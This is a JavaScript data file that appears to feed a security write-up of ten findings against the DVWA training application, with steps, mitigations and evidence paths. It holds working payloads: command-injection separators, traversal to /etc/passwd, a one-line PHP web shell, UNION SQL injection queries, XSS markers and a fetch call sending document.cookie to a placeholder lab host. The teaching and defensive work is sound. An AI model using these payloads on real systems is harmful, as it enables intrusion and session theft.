const FINDINGS = [
  {
    id: "brute-force",
    number: "01",
    title: "Brute-force authentication",
    category: "Authentication",
    severity: "Medium",
    summary: "Repeated credential attempts could be automated because the login flow did not introduce an effective rate or lockout barrier.",
    impact: "A predictable login response and unrestricted retry window can turn exposed credentials or weak passwords into account takeover.",
    rootCause: "The authentication endpoint accepts repeated combinations without adaptive throttling, progressive delay or robust detection.",
    steps: [
      "Captured the login request and isolated the username and password parameters.",
      "Configured paired payload positions in Burp Suite Intruder.",
      "Compared status, response length and page behavior across attempts.",
      "Identified the outlier response that indicated a successful lab login."
    ],
    payloads: [
      { label: "Intruder configuration", code: "Attack type: Cluster bomb\nPosition A: username\nPosition B: password" }
    ],
    mitigations: ["Per-account and per-IP throttling", "Progressive retry delays", "Multi-factor authentication", "Generic failure responses and alerting"],
    evidence: [
      ["assets/evidence/brute-force/01-captured-request.webp", "DVWA login surface", "The controlled authentication form used as the test entry point."],
      ["assets/evidence/brute-force/02-attack-type.webp", "Combination strategy", "Cluster Bomb mode pairs values from two controlled payload sets."],
      ["assets/evidence/brute-force/03-payload-positions.webp", "Parameter placement", "Both credential fields are marked as independent payload positions."],
      ["assets/evidence/brute-force/04-payload-list.webp", "Payload configuration", "A bounded lab list is assigned to each selected request position."],
      ["assets/evidence/brute-force/06-length-difference.webp", "Response outlier", "A different content length provides a reliable success signal in the lab." ]
    ]
  },
  {
    id: "command-injection",
    number: "02",
    title: "Operating-system command injection",
    category: "Server-side injection",
    severity: "Critical",
    summary: "User-controlled data reached an operating-system command context, allowing shell operators to introduce an additional command.",
    impact: "Successful injection can expose files, application secrets and ultimately the host operating system under the web-service account.",
    rootCause: "The application builds a shell command from raw input and relies on incomplete character blacklists rather than safe process APIs.",
    steps: [
      "Established the expected ping behavior with a loopback address.",
      "Added command separators appropriate to each DVWA security level.",
      "Observed output from the injected command in the application response.",
      "Compared source filters to the bypass that remained available."
    ],
    payloads: [
      { label: "Low security example", code: "127.0.0.1; id" },
      { label: "Medium filter check", code: "127.0.0.1 & id" },
      { label: "High filter check", code: "127.0.0.1|id" }
    ],
    mitigations: ["Avoid shell execution entirely", "Use parameterized process APIs", "Strictly validate IP address syntax", "Run the service with least privilege"],
    evidence: [
      ["assets/evidence/command-injection/01-low-result.webp", "Direct command chaining", "The additional lab command returns operating-system output in the page."],
      ["assets/evidence/command-injection/02-medium-source.webp", "Incomplete blacklist", "The medium-level filter blocks selected separators but leaves alternatives."],
      ["assets/evidence/command-injection/03-medium-bypass.webp", "Medium-level bypass", "A remaining shell operator reaches the command interpreter."],
      ["assets/evidence/command-injection/04-high-source.webp", "High-level review", "Source inspection highlights why normalization and allow-listing matter." ]
    ]
  },
  {
    id: "csrf",
    number: "03",
    title: "Cross-site request forgery",
    category: "Session security",
    severity: "Medium",
    summary: "A sensitive password-change action accepted a predictable request based only on the victim’s active session.",
    impact: "An attacker can cause an authenticated browser to perform an unwanted state change without learning the current password.",
    rootCause: "The action lacks a validated anti-CSRF token and does not adequately verify the origin or intent of the request.",
    steps: [
      "Recorded the password-change request shape inside an active DVWA session.",
      "Constructed the same state-changing request with controlled values.",
      "Triggered it while the authenticated browser context was available.",
      "Confirmed the change by comparing old and new login behavior."
    ],
    payloads: [
      { label: "Lab request pattern", code: "/vulnerabilities/csrf/?password_new=[VALUE]&password_conf=[VALUE]&Change=Change" }
    ],
    mitigations: ["Synchronizer or double-submit CSRF tokens", "SameSite session cookies", "Origin and Referer validation", "Current-password confirmation for sensitive changes"],
    evidence: [
      ["assets/evidence/csrf/01-request.webp", "State-changing request", "The password-change operation is represented entirely in predictable request parameters."],
      ["assets/evidence/csrf/02-valid-password.webp", "Baseline access", "The original lab credentials work before the forged state change."],
      ["assets/evidence/csrf/03-wrong-password.webp", "Old value rejected", "The previous password no longer authenticates after the request."],
      ["assets/evidence/csrf/04-after.webp", "Change verified", "Successful access with the controlled replacement value confirms impact." ]
    ]
  },
  {
    id: "file-inclusion",
    number: "04",
    title: "Local and remote file inclusion",
    category: "File handling",
    severity: "High",
    summary: "A page-selection parameter could be manipulated to load resources beyond the intended application allow-list.",
    impact: "File inclusion may disclose host files, expose source code or execute remotely controlled content when dangerous wrappers are enabled.",
    rootCause: "The application treats user input as a file path and applies pattern replacement instead of mapping a fixed identifier to an approved resource.",
    steps: [
      "Confirmed the intended file-loading behavior with a known application page.",
      "Introduced traversal sequences to move outside the application directory.",
      "Tested URL and file wrappers where the lab configuration allowed them.",
      "Compared low, medium and high filters to their observable bypasses."
    ],
    payloads: [
      { label: "Traversal pattern", code: "?page=../../../../../../etc/passwd" },
      { label: "Normalized bypass pattern", code: "?page=..././..././..././etc/passwd" },
      { label: "Local wrapper pattern", code: "?page=file:///etc/passwd" }
    ],
    mitigations: ["Map IDs to an immutable file allow-list", "Reject wrappers and absolute paths", "Normalize and verify canonical paths", "Disable unnecessary remote include features"],
    evidence: [
      ["assets/evidence/file-inclusion/01-normal-page.webp", "Expected include", "A valid application file establishes the normal page-selection flow."],
      ["assets/evidence/file-inclusion/02-lfi-passwd.webp", "Traversal result", "A traversal string reaches a host file outside the web root."],
      ["assets/evidence/file-inclusion/03-rfi-google.webp", "Remote resource test", "The lab attempts to resolve an externally hosted resource."],
      ["assets/evidence/file-inclusion/04-medium-bypass.webp", "Normalization bypass", "Nested traversal syntax survives the medium-level replacement logic."],
      ["assets/evidence/file-inclusion/05-high-source.webp", "High-level condition", "The reviewed check accepts a broader input family than intended."],
      ["assets/evidence/file-inclusion/06-high-file-bypass.webp", "Wrapper-based access", "A local file wrapper still exposes the protected host resource." ]
    ]
  },
  {
    id: "file-upload",
    number: "05",
    title: "Unrestricted executable upload",
    category: "File handling",
    severity: "Critical",
    summary: "The upload workflow accepted a server-executable file and placed it in a location reachable through the web server.",
    impact: "An executable upload can become remote code execution, enabling data access and host compromise in the service account context.",
    rootCause: "File type, content and destination controls do not enforce a non-executable allow-list or isolate uploads from the application runtime.",
    steps: [
      "Prepared a minimal lab file that prints the result of a controlled command parameter.",
      "Submitted it through the image upload interface.",
      "Opened the returned upload path directly in the browser.",
      "Confirmed server-side execution with harmless directory inspection commands."
    ],
    payloads: [
      { label: "Demonstration file", code: "<?php echo shell_exec($_GET['cmd']); ?>" },
      { label: "Controlled request", code: "/hackable/uploads/lab.php?cmd=pwd" }
    ],
    mitigations: ["Allow-list extensions and verified MIME signatures", "Generate server-side file names", "Store uploads outside the web root", "Serve from a non-executable isolated origin"],
    evidence: [
      ["assets/evidence/file-upload/01-shell-code.webp", "Upload accepted", "The training application accepts a PHP file through its upload control."],
      ["assets/evidence/file-upload/02-upload-success.webp", "Server path returned", "The success response reveals a directly addressable upload location."],
      ["assets/evidence/file-upload/03-pwd-result.webp", "Execution context", "A harmless command returns the server-side working directory."],
      ["assets/evidence/file-upload/04-ls-result.webp", "Directory output", "Listing output confirms that the uploaded file executes on the host." ]
    ]
  },
  {
    id: "sql-injection",
    number: "06",
    title: "UNION-based SQL injection",
    category: "Database injection",
    severity: "High",
    summary: "Unsafely composed database queries allowed a controlled UNION clause to change the result set returned by the application.",
    impact: "An attacker may enumerate schemas, retrieve application records and expose password hashes or other sensitive data.",
    rootCause: "Untrusted input is concatenated into SQL instead of being bound through a prepared statement with least-privileged database access.",
    steps: [
      "Determined the visible query shape and compatible output columns.",
      "Enumerated database metadata through information_schema in the lab.",
      "Located the DVWA users table and relevant columns.",
      "Demonstrated the downstream risk of weak, unsalted password hashes."
    ],
    payloads: [
      { label: "Schema enumeration", code: "-1' UNION SELECT 1, schema_name FROM information_schema.schemata #" },
      { label: "Table enumeration", code: "-1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #" },
      { label: "Column enumeration", code: "-1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #" }
    ],
    mitigations: ["Prepared statements for every dynamic value", "Least-privileged database account", "Generic database error handling", "Modern salted password hashing such as Argon2id"],
    evidence: [
      ["assets/evidence/sql-injection/01-show-databases.webp", "Schema discovery", "A UNION result reveals database schema names in the lab response."],
      ["assets/evidence/sql-injection/02-query-explanation.webp", "Table discovery", "Metadata queries identify the tables belonging to the DVWA schema."],
      ["assets/evidence/sql-injection/03-show-tables.webp", "Column discovery", "The next query narrows the result to fields in the users table."],
      ["assets/evidence/sql-injection/04-show-columns.webp", "Record extraction", "Application usernames and legacy password hashes appear in the modified result."],
      ["assets/evidence/sql-injection/05-read-users-passwords.webp", "Hash preparation", "Extracted lab hashes are prepared for an offline strength demonstration."],
      ["assets/evidence/sql-injection/06-hash-cracking.webp", "Weak hash impact", "Default DVWA examples illustrate how quickly weak MD5 hashes can be recovered." ]
    ]
  },
  {
    id: "dom-xss",
    number: "07",
    title: "DOM-based cross-site scripting",
    category: "Client-side injection",
    severity: "Medium",
    summary: "Client-side JavaScript moved a URL-controlled value into an executable document context without safe encoding.",
    impact: "A crafted link can execute script in the application origin and interact with data available to the victim’s browser session.",
    rootCause: "An unsafe DOM sink receives location-derived input without contextual encoding or a restrictive content security policy.",
    steps: [
      "Located the URL parameter read by the client-side language selector.",
      "Replaced the expected value with a harmless alert payload.",
      "Loaded the crafted URL in the controlled browser.",
      "Confirmed execution without requiring a new server response body."
    ],
    payloads: [
      { label: "Controlled DOM payload", code: "default=<script>alert('DOM XSS')</script>" }
    ],
    mitigations: ["Use textContent and safe DOM APIs", "Validate values against an allow-list", "Avoid innerHTML for untrusted data", "Deploy a nonce-based Content Security Policy"],
    evidence: [
      ["assets/evidence/dom-xss/01-payload.webp", "URL-controlled input", "The crafted value reaches the page through a client-read parameter."],
      ["assets/evidence/dom-xss/02-alert.webp", "Browser execution", "The controlled alert confirms that the browser treated the value as script." ]
    ]
  },
  {
    id: "reflected-xss",
    number: "08",
    title: "Reflected cross-site scripting",
    category: "Client-side injection",
    severity: "High",
    summary: "Submitted input was immediately reflected into the response without context-aware output encoding.",
    impact: "A malicious link can execute script under the trusted application origin, enabling interface manipulation or session-data access.",
    rootCause: "The response template places attacker-controlled text into HTML markup as executable content.",
    steps: [
      "Submitted a benign script marker through the reflected input field.",
      "Observed the value return in the generated response.",
      "Used a cookie-read alert to demonstrate origin-level script access.",
      "Redacted the ephemeral session value before publication."
    ],
    payloads: [
      { label: "Execution marker", code: "<script>alert('reflected')</script>" },
      { label: "Session access demonstration", code: "<script>alert(document.cookie)</script>" }
    ],
    mitigations: ["Context-aware output encoding", "Templating with automatic escaping", "HttpOnly and SameSite session cookies", "Content Security Policy as defense in depth"],
    evidence: [
      ["assets/evidence/reflected-xss/01-payload.webp", "Reflected payload", "The input contains a script expression that the response fails to encode."],
      ["assets/evidence/reflected-xss/02-cookie-alert.webp", "Origin-level access", "A redacted cookie alert demonstrates the consequence of browser execution." ]
    ]
  },
  {
    id: "stored-xss",
    number: "09",
    title: "Stored cross-site scripting",
    category: "Persistent client-side injection",
    severity: "High",
    summary: "A message field persisted executable markup, allowing the payload to run again when the stored record was rendered.",
    impact: "Persistent script can affect every user who views the poisoned content, increasing reach beyond a single crafted request.",
    rootCause: "The application stores untrusted markup and later renders it without sanitization or output encoding.",
    steps: [
      "Entered a harmless script marker in the guestbook message field.",
      "Submitted the record and allowed the application to persist it.",
      "Reloaded the affected view in the controlled browser.",
      "Confirmed that the stored value was handled as active markup."
    ],
    payloads: [
      { label: "Persistent marker", code: "<script>alert('stored')</script>" }
    ],
    mitigations: ["Encode untrusted content on every output", "Sanitize permitted rich text with a maintained library", "Set HttpOnly on session cookies", "Apply a restrictive Content Security Policy"],
    evidence: [
      ["assets/evidence/stored-xss/01-message.webp", "Persistent input", "The guestbook accepts executable markup in a field intended for plain text." ]
    ]
  },
  {
    id: "cookie-stealing",
    number: "10",
    title: "Session exfiltration through XSS",
    category: "Attack-chain impact",
    severity: "High",
    summary: "The XSS condition was extended into a controlled request that demonstrated how readable session data could leave the browser.",
    impact: "When a session cookie is script-readable, XSS can convert browser execution into session theft and account impersonation.",
    rootCause: "The application combines an XSS sink with session cookies that are available to JavaScript and insufficient browser-side restrictions.",
    steps: [
      "Started a local HTTP listener inside the isolated lab network.",
      "Used a training payload to send document.cookie to that listener.",
      "Observed the controlled request in the listener log.",
      "Redacted both the local address and ephemeral session value for publication."
    ],
    payloads: [
      { label: "Local listener", code: "python3 -m http.server 8000" },
      { label: "Training-only request pattern", code: "<script>fetch('http://LAB-HOST:8000/?cookie=' + document.cookie)</script>" }
    ],
    mitigations: ["Eliminate the underlying XSS", "Set Secure, HttpOnly and SameSite cookie attributes", "Restrict outbound destinations with CSP connect-src", "Rotate sessions after sensitive events"],
    evidence: [
      ["assets/evidence/cookie-stealing/01-server.webp", "Controlled browser request", "The reflected input carries a request pattern inside the isolated DVWA lab."],
      ["assets/evidence/cookie-stealing/02-cookie-log.webp", "Listener confirmation", "The sanitized local log confirms receipt without publishing a session value." ]
    ]
  }
];
